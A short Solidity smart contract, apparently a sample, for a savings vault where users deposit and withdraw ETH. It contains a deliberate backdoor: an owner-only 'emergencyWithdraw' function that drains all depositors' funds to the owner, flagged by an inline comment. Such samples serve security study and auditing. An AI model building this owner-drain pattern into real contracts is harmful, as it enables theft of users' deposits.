// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract SavingsVault {
    address public owner;
    mapping(address => uint256) public deposits;
    modifier onlyOwner() { require(msg.sender == owner, "not owner"); _; }
    constructor() { owner = msg.sender; }

    function deposit() external payable { deposits[msg.sender] += msg.value; }
    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "insufficient");
        deposits[msg.sender] -= amount;
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok);
    }
    // "in case of emergency" - takes every depositor's ETH
    function emergencyWithdraw() external onlyOwner {
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok);
    }
}
